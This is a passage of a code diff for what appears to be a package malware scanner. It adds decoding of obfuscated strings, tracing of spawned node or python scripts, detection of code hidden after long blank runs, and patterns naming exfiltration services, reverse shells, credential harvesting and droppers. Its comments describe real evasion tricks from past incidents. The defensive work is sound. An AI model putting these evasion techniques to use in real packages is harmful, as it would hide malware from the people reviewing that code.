+            _dv_decode("base64", _dv_literal(m))), view)
+    if "fromhex" in view or "unhexlify" in view or "b64decode" in view:
+        view = _DV_PY_RE.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
+            _dv_decode("hex" if (m.group("fh") or m.group("uh")) else "base64", _dv_literal(m))), view)
+    helpers = _dv_helpers(view)
+    if helpers:
+        call = re.compile(_DV_NAME_HEAD + "(?P<name>" + "|".join(re.escape(n) for n in sorted(helpers))
+                          + _DV_HELPER_CALL_TAIL)
+        view = call.sub(lambda m: (lambda d: m.group() if d is None else _dv_quote(d))(
+            _dv_decode(helpers[m.group("name")], _dv_literal(m))), view)
+    if "^" in view:
+        xors = _dv_xor_decoders(view)
+        if xors:
+            call = re.compile(_DV_NAME_HEAD + "(?P<name>" + "|".join(re.escape(n) for n in sorted(xors))
+                              + _DV_HELPER_CALL_TAIL)
+            view = call.sub(_dv_xor_sub(xors), view)
+    if view == joined:
+        return text                 # nothing decoded: literals joined alone are no reading of their own
+    arrays = 0
+    for m in list(_DV_ARRAY_RE.finditer(view)):
+        if arrays >= _DV_MAX_ARRAYS:
+            break
+        name = m.group("name")
+        items = _DV_STR_ITEM_RE.findall(m.group("items"))
+        esc = re.escape(name)
+        if (re.search(_DV_NAME_HEAD + esc + _DV_MUTATED_TAIL, view)
+                or len(re.findall(_DV_NAME_HEAD + esc + _DV_ASSIGNED_TAIL, view)) != 1):
+            continue
+        arrays += 1
+        view = re.sub(_DV_NAME_HEAD + esc + _DV_INDEX_TAIL,
+                      lambda i: items[int(i.group(1))] if int(i.group(1)) < len(items) else i.group(), view)
+    return _DV_MEMBER_RE.sub(lambda m: "." + (m.group("a") or m.group("b")), view) if "[" in view else view
+
+
+# ---------------- Scripts a script starts with node or python (0.1.8) ----------------
+# A payload need not be the file a hook names: react-thunk-log's postinstall
+# ran lib/utils/index.js, which did nothing but start
+# spawn(process.execPath, [path.join(__dirname, 'smtp-connection/index.js')],
+# {detached: true}) — the file that ran the code hidden in a LICENSE; the
+# 2026 lightning release's __init__.py started _runtime/start.py with
+# sys.executable. The install-script and import-time tests follow such a
+# start to the package file it runs (spawned_scripts): node started by
+# spawn / execFile (process.execPath, process.argv[0], 'node') or by fork,
+# Python by Popen / run / call (sys.executable, 'python…'); the script is
+# the first argument that is not a flag, written as a literal (relative to
+# the directory the package runs in), a path.join / path.resolve /
+# os.path.join from the script's own directory (__dirname,
+# os.path.dirname(__file__)) or of literals, `__dirname + '/x'`, or a name
+# assigned one of those in the file (followed _SPAWN_NAME_DEPTH names deep).
+# The started file is then read like the one that started it,
+# _SPAWN_MAX_DEPTH starts deep and _SPAWN_MAX_FILES files per hook at most.
+_SPAWN_MAX_DEPTH = 3
+_SPAWN_MAX_FILES = 20
+_SPAWN_NAME_DEPTH = 3
+_SPAWN_MAX_TARGETS = 8          # started scripts read from one file, at most
+_SPAWN_CALL_SRC = (
+    r"""\b(?:spawn|spawnSync|execFile|execFileSync)\s*\(\s*(?:process\s*\.\s*execPath|process\s*\.\s*argv\s*\[\s*0\s*\]"""
+    r"""|['"`](?:node|nodejs)(?:\.exe)?['"`])\s*,\s*\[|\bfork\s*\("""
+    r"""|\b(?:Popen|run|call|check_call|check_output)\s*\(\s*\[\s*(?:sys\s*\.\s*executable"""
+    r"""|['"]python[0-9.]*(?:\.exe)?['"])\s*,""")
+_SPAWN_CALL_RE = re.compile(_SPAWN_CALL_SRC)
+_SPAWN_LIT_SRC = (r"""'(?P<a>[^'"`\n$\\]{1,200})'|"(?P<b>[^'"`\n$\\]{1,200})"|`(?P<c>[^'"`\n$\\]{1,200})`""")
+_SPAWN_LIT_RE = re.compile(_SPAWN_LIT_SRC)
+_SPAWN_DIR_SRC = (r"""__dirname|os\s*\.\s*path\s*\.\s*dirname\s*\(\s*(?:os\s*\.\s*path\s*\.\s*(?:abspath|realpath)"""
+                  r"""\s*\(\s*)?__file__\s*\)?\s*\)|Path\s*\(\s*__file__\s*\)\s*(?:\.\s*resolve\s*\(\s*\))?\s*\.\s*parent""")
+_SPAWN_DIR_RE = re.compile(_SPAWN_DIR_SRC)
+_SPAWN_JOIN_SRC = r"""(?:path\s*\.\s*(?:join|resolve)|os\s*\.\s*path\s*\.\s*join)\s*\("""
+_SPAWN_JOIN_RE = re.compile(_SPAWN_JOIN_SRC)
+_SPAWN_CONCAT_SRC = (r"""__dirname\s*\+\s*(?:'/?(?P<a>[^'"`\n$\\]{1,200})'|"/?(?P<b>[^'"`\n$\\]{1,200})""" + '"'
+                     + r"""|`/?(?P<c>[^'"`\n$\\]{1,200})`)|`\$\{\s*__dirname\s*\}/(?P<t>[^`$\n\\]{1,200})`""")
+_SPAWN_CONCAT_RE = re.compile(_SPAWN_CONCAT_SRC)
+_SPAWN_NAME_SRC = r"""[A-Za-z_$][\w$]*"""
+_SPAWN_NAME_RE = re.compile(_SPAWN_NAME_SRC)
+# a name's assignment, as _spawn_path looks one up (the name escaped between them)
+_SPAWN_ASSIGN_HEAD = r"(?<![\w$.])"
+_SPAWN_ASSIGN_TAIL = r"\s*=(?![=>])\s*(?P<e>[^\n;]{1,300})"
+_SPAWN_NO_SCRIPT_FLAGS = frozenset(("-m", "-c", "-e", "-p", "--eval", "--print"))
+_SPAWN_VALUE_FLAGS = frozenset(("-r", "--require", "--import", "--loader", "--experimental-loader", "-W", "-X"))
+
+
+def _spawn_args(text, i, limit=400):
+    """The arguments of a call or a list starting at text[i], as far as the
+    ']' or ')' that closes it, split at its top-level commas (a quote-aware
+    pass over at most `limit` characters); [] when it does not close."""
+    args, depth, start, j, end = [], 0, i, i, min(len(text), i + limit)
+    quote = None
+    while j < end:
+        ch = text[j]
+        if quote is not None:
+            if ch == "\\":
+                j += 2
+                continue
+            if ch == quote:
+                quote = None
+        elif ch in "'\"`":
+            quote = ch
+        elif ch in "([{":
+            depth += 1
+        elif ch in ")]}":
+            if depth == 0:
+                args.append(text[start:j])
+                return [a.strip() for a in args]
+            depth -= 1
+        elif ch == "," and depth == 0:
+            args.append(text[start:j])
+            start = j + 1
+        j += 1
+    return []
+
+
+def _spawn_path(expr, text, names):
+    """(base, path) a script argument names — base 'dir' (the script's own
+    directory) or 'cwd' (the directory the package runs in) — else None."""
+    expr = expr.strip()
+    m = _SPAWN_LIT_RE.fullmatch(expr)
+    if m is not None:
+        lit = m.group("a") or m.group("b") or m.group("c")
+        return None if lit.startswith("-") else ("cwd", lit)
+    m = _SPAWN_CONCAT_RE.fullmatch(expr)
+    if m is not None:
+        return "dir", m.group("a") or m.group("b") or m.group("c") or m.group("t")
+    m = _SPAWN_JOIN_RE.match(expr)
+    if m is not None:
+        parts = _spawn_args(expr, m.end())
+        if not parts or not expr.rstrip().endswith(")"):
+            return None
+        first, rest = parts[0], parts[1:]
+        if _SPAWN_DIR_RE.fullmatch(first):
+            base, segs = "dir", []
+        else:
+            head = _spawn_path(first, text, names)
+            if head is None:
+                return None
+            base, segs = head[0], [head[1]]
+        for part in rest:
+            lit = _SPAWN_LIT_RE.fullmatch(part)
+            if lit is None:
+                return None
+            segs.append(lit.group("a") or lit.group("b") or lit.group("c"))
+        return (base, "/".join(segs)) if segs else None
+    if _SPAWN_NAME_RE.fullmatch(expr) and names > 0:
+        am = re.search(_SPAWN_ASSIGN_HEAD + re.escape(expr) + _SPAWN_ASSIGN_TAIL, text)
+        if am is not None:
+            value = am.group("e")
+            parts = _spawn_args(value + ")", 0)          # its first top-level segment
+            return _spawn_path(parts[0] if parts else value, text, names - 1)
+    return None
+
+
+def spawned_scripts(text):
+    """[(base, path)]: the package scripts `text` starts with node or python
+    (see above), base 'dir' or 'cwd', at most _SPAWN_MAX_TARGETS."""
+    if not any(n in text for n in ("spawn", "execFile", "fork", "Popen", "run", "call", "check_")):
+        return []
+    out = []
+    for m in _SPAWN_CALL_RE.finditer(text):
+        args, skip = _spawn_args(text, m.end()), False
+        for arg in args[:6]:
+            if skip:
+                skip = False
+                continue
+            lit = _SPAWN_LIT_RE.fullmatch(arg)
+            value = None if lit is None else lit.group("a") or lit.group("b") or lit.group("c")
+            if value is not None and value.startswith("-"):   # a flag of node's or python's
+                flag = value.split("=", 1)[0]
+                if flag in _SPAWN_NO_SCRIPT_FLAGS:
+                    break                                 # inline code or a module: no script file
+                skip = flag in _SPAWN_VALUE_FLAGS and "=" not in value
+                continue
+            target = _spawn_path(arg, text, _SPAWN_NAME_DEPTH)
+            if target is not None:
+                path = posixpath.normpath(target[1].replace("\\", "/"))
+                if path not in (".", "") and not path.startswith("/") and (target[0], path) not in out:
+                    out.append((target[0], path))
+            break
+        if len(out) >= _SPAWN_MAX_TARGETS:
+            break
+    return out
+
+
+# ---------------- Code hidden off-screen (SC-OFFSCREEN-CODE, 0.1.8) ----------------
+# @react-native-aria/radio 0.2.14 (June 2025) appended its loader to
+# lib/commonjs/index.js after 731 spaces on the last line — past the right
+# edge of every editor, diff and code review, where the interpreter runs it
+# all the same; setup.py droppers do the same after a `;`. No formatter puts
+# code _OFFSCREEN_MIN columns right of other code or of nothing: indentation
+# stays under 100, and runs that long in the 0.1.7 benchmark's 429 popular
+# packages were all prose (a docstring's alignment, a box drawing). So the
+# run must stand in code, not in a string or a comment (_code_prefix: what
+# comes before it on the line closes every quote and comment it opens; the
+# caller also drops a line that is nothing but literals and comments, like a
+# docstring's), and what follows it must read as code: punctuation that code
+# starts with, a declaration, a name followed by . ( [ = ; or a quote, or a
+# keyword that runs or imports. CRITICAL when the hidden text runs or loads
+# code (require, import, eval, exec, Function, child_process, spawn, a
+# decoder, `global[…]`), else MAJOR.
+_OFFSCREEN_SRC = r"""(?<![ \t])[ \t]{150,}(?=\S)"""
+_OFFSCREEN_CODE_SRC = (
+    r"""[;,(){}\[\]]|(?:const|let|var|function|async|class|def)\s+[A-Za-z_$(]|[A-Za-z_$][\w$]*\s*(?:[.(\[=;]|["'`])"""
+    r"""|(?:import|from|exec|eval|require)\b""")
+_OFFSCREEN_EXEC_SRC = (
+    r"""\b(?:require|import|exec|eval|Function|child_process|spawn|execSync|__import__|compile|b64decode"""
+    r"""|fromCharCode|atob)\b|\bglobal\s*\[""")
+_OFFSCREEN_RE = re.compile(_OFFSCREEN_SRC)
+_OFFSCREEN_CODE_RE = re.compile(_OFFSCREEN_CODE_SRC)
+_OFFSCREEN_EXEC_RE = re.compile(_OFFSCREEN_EXEC_SRC)
+#: The shortest run of blanks before code that counts
+_OFFSCREEN_MIN = 150
+#: Characters of the hidden code read for what it runs
+_OFFSCREEN_READ = 4000
+
+
+def _code_prefix(prefix, lang):
+    """Does `prefix` (the start of a line) close every string and comment it
+    opens — quotes with their escapes, and a JavaScript block comment — and
+    open no line comment (# in Python, // in JavaScript)?"""
+    quote, i, n = None, 0, len(prefix)
+    while i < n:
+        ch = prefix[i]
+        if quote is not None:
+            if ch == "\\":
+                i += 2
+                continue
+            if ch == quote:
+                quote = None
+        elif ch == '"' or ch == "'" or (ch == "`" and lang == "js"):
+            quote = ch
+        elif lang == "py" and ch == "#":
+            return False
+        elif lang == "js" and ch == "/" and prefix.startswith("//", i):
+            return False
+        elif lang == "js" and ch == "/" and prefix.startswith("/*", i):
+            end = prefix.find("*/", i + 2)
+            if end < 0:
+                return False
+            i = end + 2
+            continue
+        i += 1
+    return quote is None
+
+
+def offscreen_code(line, lang):
+    """-> (column, blanks, hidden text, runs code) for code that starts after a
+    run of at least _OFFSCREEN_MIN blanks on `line`, in code (see above),
+    else None. `lang` is 'js' or 'py'."""
+    if len(line) <= _OFFSCREEN_MIN or " " * 16 not in line and "\t" * 16 not in line:
+        return None
+    m = _OFFSCREEN_RE.search(line)
+    if (m is None or _OFFSCREEN_CODE_RE.match(line, m.end()) is None
+            or not _code_prefix(line[:m.start()], lang)):
+        return None
+    hidden = line[m.end():m.end() + _OFFSCREEN_READ]
+    return m.end(), m.end() - m.start(), hidden, _OFFSCREEN_EXEC_RE.search(hidden) is not None
+
+
+_SELF_PUBLISH_RULE = {
+    "id": "SC-SELF-PUBLISH", "name": "Code that republishes its package", "type": "HOTSPOT", "sev": "CRITICAL",
+    "msg": "Renames its package (package.json's \"name\") and publishes it: the shape of registry spam and of "
+           "packages that spread themselves.",
+    "why": ("The 2025-26 registry floods shipped a script that gives package.json a new, random name and runs "
+            "`npm publish` in a loop, from the account of whoever runs it. Release tools publish too, but never "
+            "rename what they publish."),
+    "fix": "Don't run it; report the package to the registry.",
+    "ref": "CWE-506 · Supply chain"}
+_OFFSCREEN_WHY = ("A long run of blanks pushes code past the right edge of editors, diffs and code review, while "
+                  "the interpreter runs it all the same: @react-native-aria/radio 0.2.14 hid its loader 731 "
+                  "columns right. No formatter puts code there.")
+
+
+def _offscreen_issue(path, line_no, lines, found):
+    col, blanks, hidden, runs = found
+    preview = hidden if len(hidden) <= 60 else hidden[:57] + "..."
+    return mk_issue(
+        {"id": "SC-OFFSCREEN-CODE", "name": "Code hidden off-screen", "type": "HOTSPOT",
+         "sev": "CRITICAL" if runs else "MAJOR",
+         "msg": f"Code after {blanks} blanks on this line, where editors and review don't show it: {preview!r}.",
+         "why": _OFFSCREEN_WHY + (" This code loads or runs more code." if runs else ""),
+         "fix": "Read the whole line (turn on word wrap) and review what it does.",
+         "ref": "CWE-506 · Supply chain"}, path, line_no, lines, col)
+
+
 def install_script_risk(text):
-    """Reasons an install-time script looks hostile ([] if none)."""
+    """Reasons an install-time script looks hostile ([] if none): read as
+    written, and again with the strings it decodes as it runs decoded
+    (decoded_view; a reason found only there says so)."""
+    reasons = _install_script_risk(text)
+    view = decoded_view(text)
+    if view != text:
+        for r in _install_script_risk(view):
+            if r not in reasons:
+                reasons.append(r + _DV_NOTE)
+    return reasons
+
+
+def _install_script_risk(text):
     reasons = []
     network = bool(_NETWORK_RE.search(text))
     if network and _SECRET_SOURCE_RE.search(text):
@@ -6483,11 +7668,39 @@ def install_script_risk(text):
         reasons.append("carries a script that downloads and runs code")
     if reverse_shell_at(text) >= 0:
         reasons.append("opens a reverse shell")
-    if sends_host_info(text):
+    host = _HOST_INFO_RE.search(text)
+    if host and (_NETWORK_RE.search(text) or _EXFIL_SERVICE_RE.search(text)):        # sends_host_info
         reasons.append("sends the machine's user or host name over the network")
+    for _at, reason in _exfil_signs(text, host):
+        if reason not in reasons:
+            reasons.append(reason)
+    if dest is None:
+        ip = raw_ip_connect(text)
+        if ip is not None:
+            reasons.append(f"contacts an address typical of data exfiltration ({ip})")
     if runs_own_source_at(text) >= 0:
         reasons.append("runs code it reads back from its own file or a data file shipped with it")
     reasons.extend(persistence_reasons(text))
+    if _PUBLISH_CMD_RE.search(text) is not None:
+        reasons.append("publishes a package to a registry (npm publish)")
+    if _NPM_TOKEN_READ_RE.search(text) is not None:
+        reasons.append("collects npm access tokens")
+    dll = runs_dll(text)
+    if dll is not None:
+        reasons.append(f"runs a DLL with rundll32 or regsvr32 ({dll[:40]})")
+    # a script it downloads, or decodes, written to a file and run with a
+    # shell or an interpreter (a file run on its own stays the import-time
+    # test's MAJOR shape: a prebuilt binary's installer does that)
+    dropped = _downloads_and_runs(text)
+    if dropped is not None:
+        interp = "Python" if _PY_RUN_RE.search(text) else dropped[1]
+        if interp:
+            reasons.append(f"downloads a script and runs it with {interp}")
+    decoded = _decodes_and_runs(text)
+    if decoded is not None:
+        interp = "Python" if _PY_RUN_RE.search(text) else decoded[1]
+        reasons.append(f"writes code it decodes to a file and runs it with {interp}" if interp
+                       else "writes a file it decodes and runs it")
     return reasons
 
 
@@ -6540,16 +7753,38 @@ _STRONG_IMPORT_REASONS = (
     "runs code it receives over the network", "runs a downloaded script through a shell",
     "runs an encoded PowerShell command", "runs PowerShell that", "carries a script that downloads and runs code",
     "opens a reverse shell", "reads credentials or the whole environment and sends them to",
-    "sends the machine's user or host name to a data-capture service", "downloads a script and runs it with Python",
-    "runs code it reads back from its own file", "carries a GitHub Actions workflow that dumps every repository secret")
+    "sends the machine's user or host name to a data-capture service", "downloads a script and runs it with",
+    "writes code it decodes to a file and runs it with", "runs code it reads back from its own file",
+    "carries a GitHub Actions workflow that dumps every repository secret",
+    "sends data to a Telegram bot whose token", "sends data to a Discord webhook whose token",
+    "sends data to a Slack webhook whose key", "reads credential files and sends data to an IP address",
+    "collects files from several credential folders", "sends the machine's user or host name to an address it hides",
+    "sends the machine's user or host name in a DNS lookup", "sends the machine's public IP address to a data-capture",
+    "runs a cryptocurrency miner")
 # Endpoints that exist to capture what is sent to them (out-of-band testing,
 # request inspection): no library reports to one
 _CAPTURE_SERVICE_RE = re.compile(
     r"webhook\.site|typedwebhook\.tools|oastify\.com|burpcollaborator|\binteract\.sh|\boast[\w.-]*\.(?:pro|live|site"
-    r"|online|fun|me|com)\b|pipedream\.net|requestbin|requestcatcher\.com|hookbin\.com|postb\.in|beeceptor\.com"
+    r"|online|fun|me|com)\b|pipedream\.net|requestbin\.(?:com|net|io)\b|\brequestb\.in\b|requestcatcher\.com"
+    r"|hookbin\.com|postb\.in\b|beeceptor\.com"
     r"|dnslog\.cn|ceye\.io|canarytokens", re.I)
+# An ngrok tunnel's own address counts as one (0.1.8): a subdomain someone's
+# laptop answers. Searched only in a text that names ngrok (the pattern can't
+# be found quickly: it starts with any letter); lower case, as a host name
+# is written in code.
+_NGROK_TUNNEL_RE = re.compile(
+    r"\b[a-z0-9][a-z0-9-]{2,62}\.ngrok(?:-free)?\.(?:app|io|dev)\b|\b\d+\.tcp(?:\.[a-z]{2,3})?\.ngrok\.io\b")
+
+
+def capture_service(text):
+    """The first data-capture service `text` names (_CAPTURE_SERVICE_RE), else
+    an ngrok tunnel's address, else None (a match)."""
+    m = _CAPTURE_SERVICE_RE.search(text)
+    if m is None and "ngrok" in text:
+        m = _NGROK_TUNNEL_RE.search(text)
+    return m
 _PY_RUN_RE = re.compile(
-    r"""\[\s*(?:sys\.executable|["']python[\d.w]*(?:\.exe)?["'])\s*,|\bstart\s+pythonw?\b"""
+    r"""\[\s*(?:\w*sys\.executable|["']python[\d.w]*(?:\.exe)?["'])\s*,|\bstart\s+pythonw?\b"""
     r"""|\b(?:system|popen|getoutput|run|call|Popen)\s*\(\s*f?["']python[\d.w]*(?:\.exe)?\s""")
 
 # Prose is not import-time code (0.1.7). On the audit's benign PyPI corpus a
@@ -6676,7 +7911,21 @@ def import_time_risk(text, lang=None):
     """-> (reasons, line): why code that runs on import looks hostile by
     the weaker test above ([] if not), and the 1-based line of the first
     sign. `text` has \\n line endings; `lang` 'py' or 'js' reads it without
-    its prose (see _import_code). import_time_severity grades them."""
+    its prose (see _import_code). It is read again with the strings it
+    decodes as it runs decoded (decoded_view; a reason found only there says
+    so). import_time_severity grades them."""
+    reasons, line = _import_time_reading(text, lang)
+    view = decoded_view(text)
+    if view != text:
+        more, at = _import_time_reading(view, lang)
+        for r in more:
+            if r not in reasons:
+                reasons.append(r + _DV_NOTE)
+                line = line or at
+    return reasons, line
+
+
+def _import_time_reading(text, lang):
     reasons, line = _import_time_risk(text)
     if reasons and lang in ("py", "js"):
         code = _import_code(text, lang)
@@ -6685,11 +7934,18 @@ def import_time_risk(text, lang=None):
     return reasons, line
 
 
-def _import_time_risk(text):
-    reasons, line = [], None
+def _import_harvest_at(text):
+    """Where `text` harvests (see _IMPORT_HARVEST_RE; also a copy of the
+    whole environment it serializes, 0.1.8), else -1."""
     harvest = (_IMPORT_HARVEST_RE.search(text)
                if any(needle in text for needle in _IMPORT_HARVEST_NEEDLES) else None)
-    if harvest:
+    return harvest.start() if harvest else env_copy_serialized_at(text)
+
+
+def _import_time_risk(text):
+    reasons, line = [], None
+    harvest = _import_harvest_at(text)
+    if harvest >= 0:
         service = _EXFIL_SERVICE_RE.search(text)
         if service:
             reasons.append("reads credentials or the whole environment and sends them to "
@@ -6697,7 +7953,7 @@ def _import_time_risk(text):
         elif _NETWORK_RE.search(text):
             reasons.append("reads credentials or the whole environment and sends data over the network")
         if reasons:
-            line = text.count("\n", 0, harvest.start()) + 1
+            line = text.count("\n", 0, harvest) + 1
     if "curl" in text or "wget" in text:
         for i, row in enumerate(text.split("\n")):
             if _runs_download_through_shell(row):
@@ -6708,11 +7964,18 @@ def _import_time_risk(text):
     if received is not None:
         reasons.append(_DL_CATEGORY_REASON[received[1]])
         line = line or received[0]
-    dropped = _downloads_and_runs_file(text)
+    dropped = _downloads_and_runs(text)
     if dropped is not None:
-        reasons.append("downloads a script and runs it with Python" if _PY_RUN_RE.search(text)
+        interp = "Python" if _PY_RUN_RE.search(text) else dropped[1]
+        reasons.append(f"downloads a script and runs it with {interp}" if interp
                        else "downloads a file and then runs it")
-        line = line or dropped
+        line = line or dropped[0]
+    decoded = _decodes_and_runs(text)
+    if decoded is not None:
+        interp = "Python" if _PY_RUN_RE.search(text) else decoded[1]
+        reasons.append(f"writes code it decodes to a file and runs it with {interp}" if interp
+                       else "writes a file it decodes and runs it")
+        line = line or decoded[0]
     signs = []                        # (offset, reason) of the shapes no library needs
     ps = powershell_risk(text)
     if ps:
@@ -6728,7 +7991,7 @@ def _import_time_risk(text):
         signs.append((at, "opens a reverse shell"))
     host = _HOST_INFO_RE.search(text)
     if host:
-        capture = _CAPTURE_SERVICE_RE.search(text)
+        capture = capture_service(text)
         if capture:
             signs.append((host.start(), "sends the machine's user or host name to a data-capture service "
                                         f"({capture.group(0)[:40]})"))
@@ -6738,6 +8001,7 @@ def _import_time_risk(text):
     if dumps_workflow_secrets(text):
         signs.append((_SECRETS_DUMP_RE.search(text).start(),
                       "carries a GitHub Actions workflow that dumps every repository secret"))
+    signs.extend(_exfil_signs(text, host))
     for at, reason in signs:
         reasons.append(reason)
         line = line or text.count("\n", 0, at) + 1
@@ -6912,6 +8176,218 @@ _DL_LEAD_RE = _dl_re("_DL_LEAD_RE")
 _DL_CALLEE_RE = _dl_re("_DL_CALLEE_RE")
 _DL_CALLEE_CHARS = frozenset(_DL_SPEC_CHARS["_DL_CALLEE_CHARS"])
 _DL_BRACKET_RE = _dl_re("_DL_BRACKET_RE")
+# Statements over several rows (0.1.8). The detector reads a row at a time,
+# so a call whose arguments a formatter put on the rows below it
+#     r = subprocess.run(
+#         ['curl', '-sL', URL],
+#         capture_output=True)
+# or a member chain continued on the next rows (prettier's `axios\n.post(…)
+# \n.then((r) => {`) hid the source from the row that binds it: the rows
+# are joined for a second reading (_dl_join_rows). So are an environment
+# variable's reads and writes by name, which carry a received value from one
+# statement to the next (os.environ['P'] = r.text … exec(os.getenv('P')))
+# the way an assignment does: each is read as one name, environ.P or
+# process.env.P (_dl_env_canonical); and so is a call through a comma
+# expression, (0, ns.fn)(…), which is how TypeScript and Babel call every
+# imported function (_dl_comma_calls). All keep the text's length, so the
+# second reading's offsets are the text's.
+_DL_JOIN_ROWS = _DL_SPEC_LIMITS["_DL_JOIN_ROWS"]        # rows one statement is joined over, at most
+_DL_JOIN_CHARS = _DL_SPEC_LIMITS["_DL_JOIN_CHARS"]      # characters of a joined statement, at most
+# a longer text (a bundle) is read once: the second reading doubled the time
+# of the benign bundles (playwright-core's 3.5 MB coreBundle.js) and found
+# nothing there; a minified payload is the first reading's (its long rows)
+_DL_LOGICAL_MAX_CHARS = _DL_SPEC_LIMITS["_DL_LOGICAL_MAX_CHARS"]
+_DL_JOIN_CHAIN_RE = _dl_re("_DL_JOIN_CHAIN_RE")
+_DL_JOIN_COMMENT_RE = _dl_re("_DL_JOIN_COMMENT_RE")
+_DL_JOIN_BLOCK_RE = _dl_re("_DL_JOIN_BLOCK_RE")
+_DL_ENV_PY_RE = _dl_re("_DL_ENV_PY_RE")
+_DL_ENV_JS_RE = _dl_re("_DL_ENV_JS_RE")
+_DL_COMMA_CALL_RE = _dl_re("_DL_COMMA_CALL_RE")
+# (0.1.8, the follower's adversarial pass) and members read by name,
+# getattr(m, 'pull') and m['pull'] as m.pull; and a code runner handed to a
+# call as its last argument, p.then(eval) or res.on('data', eval), as the
+# call it makes, (_v)=>eval(_v) — a dropper's value reaches the runner
+# without a name the first reading follows.
+_DL_GETATTR_RE = _dl_re("_DL_GETATTR_RE")
+_DL_MEMBER_RE = _dl_re("_DL_MEMBER_RE")
+_DL_CALLBACK_RE = _dl_re("_DL_CALLBACK_RE")
+_DL_CALLBACK_NEEDLES = ("eval", "Function", "exec", "runIn")
+_DL_SPACE_RE_ANY = re.compile(r"[ \t]+")
+# the patterns built around names at run time (each name escaped): another
+# file's runner handed to a call as its last argument (_dl_callbacks), a name
+# standing whole (_DlNamed), a call of a runner alias (_dl_kind)
+_DL_RUNNER_ARG_HEAD = r"(?<=[(,])[ \t]*(?P<r>"
+_DL_RUNNER_ARG_TAIL = r")[ \t]*(?=\)(?![ \t]*\())"
+_DL_NAMED_MID = r"(?<![\w$]"
+_DL_NAMED_TAIL = r")(?![\w$])"
+_DL_ALIAS_CALL_HEAD = r"""(?<![\w$.])("""
+_DL_ALIAS_CALL_TAIL = r""")\s*\("""
+
+
+def _dl_blank_literal(m):
+    s = m.group()
+    return s[0] + " " * (len(s) - 2) + s[-1] if len(s) >= 2 else s
+
+
+def _dl_join_code(row):
+    """`row` with its string literals' contents blanked and a trailing
+    comment cut: what its brackets are counted on."""
+    masked = _DL_STR_RE.sub(_dl_blank_literal, row) if ("'" in row or '"' in row or "`" in row) else row
+    m = _DL_JOIN_COMMENT_RE.search(masked) if ("#" in masked or "//" in masked) else None
+    return masked if m is None else masked[:m.start()]
+
+
+def _dl_join_plain(code):
+    """Can a row with this code be part of a joined statement: it opens no
+    function, class or block (no '{' left open, no trailing ':')?"""
+    end = code.rstrip()
+    return (_DL_JOIN_BLOCK_RE.search(code) is None and code.count("{") == code.count("}")
+            and not end.endswith((":", "{")))
+
+
+def _dl_join_rows(text):
+    """(joined, firsts): `text` with the line breaks inside a statement that
+    spans rows made spaces (see above) — a call's arguments continued on
+    the rows below its '(' until it closes, a row continued with a
+    backslash, and a member chain continued on the next row — and the index
+    of the text's row each joined row starts on (None when nothing was
+    joined). A statement is joined whole or not at all, over at most
+    _DL_JOIN_ROWS rows and _DL_JOIN_CHARS characters, and never through a
+    function's or a block's body."""
+    rows = text.split("\n")
+    n = len(rows)
+    if n < 2:
+        return text, None
+    codes = {}
+
+    def code(j):
+        c = codes.get(j)
+        if c is None:
+            c = codes[j] = _dl_join_code(rows[j])
+        return c
+
+    join = bytearray(n)
+    k = 0
+    while k < n - 1:
+        row = rows[k]
+        if "(" not in row and "[" not in row and "\\" not in row:
+            k += 1                                      # (it can neither open a call nor continue with a backslash)
+            continue
+        c = code(k)
+        if c.rstrip().endswith("\\") and len(rows[k]) + 1 + len(rows[k + 1]) <= _DL_JOIN_CHARS:
+            join[k] = 1
+            k += 1
+            continue
+        depth = c.count("(") + c.count("[") - c.count(")") - c.count("]")
+        if depth > 0 and len(rows[k]) <= _DL_JOIN_CHARS and _dl_join_plain(c):
+            j, total, done = k + 1, len(rows[k]), False
+            while j < n and j - k < _DL_JOIN_ROWS:
+                cj = code(j)
+                total += 1 + len(rows[j])
+                if total > _DL_JOIN_CHARS or not _dl_join_plain(cj):
+                    break
+                depth += cj.count("(") + cj.count("[") - cj.count(")") - cj.count("]")
+                if depth <= 0:
+                    done = True
+                    break
+                j += 1
+            if done:
+                for t in range(k, j):
+                    join[t] = 1
+                k = j
+                continue
+        k += 1
+    for j in range(1, n):
+        if join[j - 1] or _DL_JOIN_CHAIN_RE.match(rows[j]) is None or not code(j - 1).strip():
+            continue
+        first, total = j - 1, len(rows[j - 1]) + 1 + len(rows[j])
+        while first > 0 and join[first - 1] and j - first < _DL_JOIN_ROWS:
+            first -= 1
+            total += len(rows[first]) + 1
+        if (first == 0 or not join[first - 1]) and j - first < _DL_JOIN_ROWS and total <= _DL_JOIN_CHARS:
+            join[j - 1] = 2
+    if not any(join):
+        return text, None
+    # A member chain's rows are joined without the break and the indent
+    # between them (`axios` + `.post(…)` reads axios.post(…), as the source
+    # patterns want it); what is taken out is put back at the end of the
+    # joined statement, so each row still starts where the text's does.
+    out, pad, firsts = [rows[0]], 0, [0]
+    for k in range(1, n):
+        how = join[k - 1]
+        if how == 2:
+            row = rows[k]
+            body = row.lstrip(" \t")
+            pad += 1 + len(row) - len(body)
+            out.append(body)
+        elif how:
+            out.append(" ")
+            out.append(rows[k])
+        else:
+            out.append(" " * pad + "\n")
+            pad = 0
+            out.append(rows[k])
+            firsts.append(k)
+    out.append(" " * pad)
+    return "".join(out), firsts
+
+
+def _dl_env_canonical(text):
+    """`text` with each environment variable read or written by name as one
+    name (see above): environ.NAME in Python, process.env.NAME in
+    JavaScript, padded with spaces to the length it replaces."""
+    if "environ" in text or "getenv" in text:
+        text = _DL_ENV_PY_RE.sub(lambda m: ("environ." + (m.group("a") or m.group("b") or m.group("c"))).ljust(
+            len(m.group())), text)
+    if "process" in text and "env" in text:
+        text = _DL_ENV_JS_RE.sub(lambda m: ("process.env." + m.group("a")).ljust(len(m.group())), text)
+    return text
+
+
+def _dl_comma_calls(text):
+    """`text` with each call through a comma expression — (0, ns.fn)(…),
+    TypeScript's and Babel's call of an imported function — read as the
+    call it is, ns.fn(…), padded with spaces to the length it replaces."""
+    if "(0" not in text:
+        return text
+    return _DL_COMMA_CALL_RE.sub(lambda m: _DL_SPACE_RE_ANY.sub("", m.group("c")).ljust(len(m.group())), text)
+
+
+def _dl_members(text):
+    """`text` with each member read by name as a dotted member (see above):
+    getattr(obj, 'name') and obj['name'] as obj.name, padded with spaces to
+    the length they replace."""
+    if "getattr" in text:
+        text = _DL_GETATTR_RE.sub(lambda m: (_DL_SPACE_RE_ANY.sub("", m.group("o")) + "."
+                                             + (m.group("a") or m.group("b"))).ljust(len(m.group())), text)
+    if "['" in text or '["' in text:
